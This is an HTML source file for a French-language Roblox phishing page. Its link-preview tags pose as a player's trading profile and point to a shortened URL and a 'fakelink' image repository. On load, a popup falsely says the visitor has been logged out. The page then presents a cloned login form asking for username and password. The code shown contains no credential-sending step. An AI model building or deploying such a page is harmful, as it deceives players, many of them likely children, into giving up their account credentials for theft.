<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Roblox</title>
  <meta property="og:title" content="sayura83k's Profile">
  <meta property="og:site_name" content="Roblox">
  <meta property="og:description" content="Je m'appelle Sayura ! Je joue beaucoup à bloxfruits ! Disponible pour trade ^^">
  <meta property="og:type" content="article">
  <meta property="og:url" content="https://urlr.me/exuJXK">
  <meta property="og:image" content="https://raw.githubusercontent.com/TheGILITCH/fakelink/main/images/noFilter.webp">
  <meta property="og:image:width" content="630">
  <meta property="og:image:height" content="1200">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:image" content="https://raw.githubusercontent.com/TheGILITCH/fakelink/main/images/noFilter.webp">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Nunito', 'Segoe UI', sans-serif;
      min-height: 100vh;
      background-image: url('https://cdn.discordapp.com/attachments/1472960458368749695/1473396970738417818/image.png?ex=69960f5c&is=6994bddc&hm=d6588a9f8465ac520940a475c396e799a4d61ea5e5b60e56a603165f053a0a30');
      background-size: cover;
      background-position: center;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .login-card {
      background: #1e1e1e;
      border: 1px solid #2e2e2e;
      border-radius: 12px;
      padding: 36px 32px;
      width: 100%;
      max-width: 370px;
      text-align: center;
    }

    .login-card h1 {
      font-size: 1.5rem;
      font-weight: 800;
      color: white;
      margin-bottom: 24px;
    }

    .input-field {
      width: 100%;
      background: #2a2a2a;
      border: 1px solid #3a3a3a;
      border-radius: 6px;
      color: white;
      font-size: 0.9rem;
      padding: 12px 14px;
      margin-bottom: 12px;
      outline: none;
      transition: border-color 0.2s;
    }
    .input-field::placeholder { color: #666; }
    .input-field:focus { border-color: #0066ff; }

    .btn-primary {
      width: 100%;
      background: #0066ff;
      color: white;
      border: none;
      border-radius: 6px;
      padding: 12px;
      font-size: 0.95rem;
      font-weight: 700;
      cursor: pointer;
      margin-bottom: 16px;
      transition: background 0.2s;
    }
    .btn-primary:hover { background: #0052cc; }

    .forgot {
      color: #aaa;
      font-size: 0.85rem;
      margin-bottom: 20px;
    }
    .forgot a { color: #aaa; text-decoration: none; }
    .forgot a:hover { color: white; }

    .divider {
      height: 1px;
      background: #2e2e2e;
      margin: 16px 0;
    }

    .btn-alt {
      width: 100%;
      background: #2a2a2a;
      color: white;
      border: 1px solid #3a3a3a;
      border-radius: 6px;
      padding: 11px;
      font-size: 0.875rem;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 10px;
      transition: background 0.2s;
    }
    .btn-alt:hover { background: #333; }

    .signup-link {
      margin-top: 16px;
      font-size: 0.85rem;
      color: #888;
    }
    .signup-link a {
      color: #4d9fff;
      text-decoration: none;
      font-weight: 600;
    }
    .signup-link a:hover { text-decoration: underline; }
  </style>
</head>
<body>

  <!-- Login -->
  <div class="login-card">
    <h1>Connexion à Roblox</h1>
    <input class="input-field" type="text" placeholder="Identifiant/E-mail/Téléphone">
    <input class="input-field" type="password" placeholder="Mot de passe">
    <button class="btn-primary">Connexion</button>
    <div class="forgot"><a href="#">Mot de passe ou nom d'utilisateur oublié ?</a></div>
    <div class="divider"></div>
    <button class="btn-alt">Envoyez-moi un code unique par email</button>
    <button class="btn-alt">Inscription rapide</button>
    <div class="signup-link">Vous n'avez pas de compte ? <a href="#">S'inscrire</a></div>
  </div>

  <!-- Popup -->
  <div id="popup-overlay" style="
    position: fixed; inset: 0; z-index: 100;
    background: rgba(0,0,0,0.55);
    display: flex; align-items: center; justify-content: center;
  ">
    <div style="
      background: #1e1e1e;
      border: 1px solid #333;
      border-radius: 14px;
      padding: 32px 30px 28px;
      max-width: 380px;
      width: 90%;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0,0,0,0.7);
    ">
      <img src="https://1000logos.net/wp-content/uploads/2017/09/Roblox-Logo.png"
           alt="Roblox"
           style="height: 120px; filter: brightness(0) invert(1); margin-bottom: 22px;">

      <p style="color: #ddd; font-size: 0.95rem; line-height: 1.6; margin-bottom: 22px;">
        Il semblerait que vous ayez été déconnecté de votre compte.<br>
        Veuillez vous reconnecter pour continuer.
      </p>

      <button onclick="document.getElementById('popup-overlay').style.display='none'" style="
        background: #0066ff; color: white; border: none; border-radius: 7px;
        padding: 11px 40px; font-size: 0.95rem; font-weight: 700; cursor: pointer;
        margin-bottom: 16px; display: block; width: 100%;
      " onmouseover="this.style.background='#0052cc'" onmouseout="this.style.background='#0066ff'">OK</button>

      <a href="https://en.help.roblox.com/hc/en-us" target="_blank" style="
        color: #4d9fff; font-size: 0.8rem; text-decoration: none;
      " onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">
        Plus d'informations
      </a>
    </div>
  </div>

</body>
</html>
